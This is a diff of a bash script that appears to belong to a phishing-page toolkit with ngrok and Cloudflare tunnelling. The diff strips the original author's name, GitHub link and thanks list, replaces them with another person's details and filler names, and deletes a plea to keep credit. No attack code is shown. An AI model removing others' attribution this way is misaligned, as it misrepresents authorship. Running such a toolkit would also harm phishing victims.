@@ -202,7 +202,7 @@ install_cloudflared() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Have a good day ^_^ .${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -210,15 +210,15 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}Alex Bieber ${RED}[ ${ORANGE}Alex-Bieber ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/alexbieber
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN}Author   ${RED}:  ${ORANGE}Amr J ${RED}[ ${ORANGE}Amr-J ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/AmrJ1
+		${GREEN}Version  ${RED}:  ${ORANGE}0.1
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Alex Bieber,1RaY-1 ${RESETBG}
+		${REDBG}${WHITE} Thanks : my,you,him
+								  a,m m,r-1 ${RESETBG}
 
 		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
+		${CYAN}This Tool is made for nothing ^_^  ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
@@ -298,7 +298,7 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to ALEX BIEBER (https://github.com/AmrJ1)
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Amr J (https://github.com/AmrJ1)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -312,7 +312,7 @@ start_ngrok() {
 }
 
 
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
+## DON'T  :')
 
 ## Start Cloudflared
 start_cloudflared() { 
